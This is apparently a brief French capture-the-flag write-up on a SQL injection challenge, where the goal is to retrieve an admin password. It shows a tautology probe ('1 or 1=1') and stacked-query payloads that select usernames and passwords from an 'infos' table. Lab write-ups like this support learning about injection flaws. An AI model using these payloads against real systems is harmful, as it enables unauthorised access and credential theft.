# Vite Mon Injection

![img](./0.png)
![img](./1.png)

## Challenge :

Récupérer le mot de passe de l'admin

## Stratégie :

On peut déjà regarder comment ça fonctionne :

 - Avec `1` => `Pas de résultat`
 - Avec `1 or 1=1` => `2`

On va voir une requête simple :

 - `1; SELECT username, password FROM infos` => `Tout les mots de passe`
 - `1; SELECT password FROM infos where username='admin'` => `Le bon mot de passe`
 
 Il suffit juste de CTRL+F maintenant.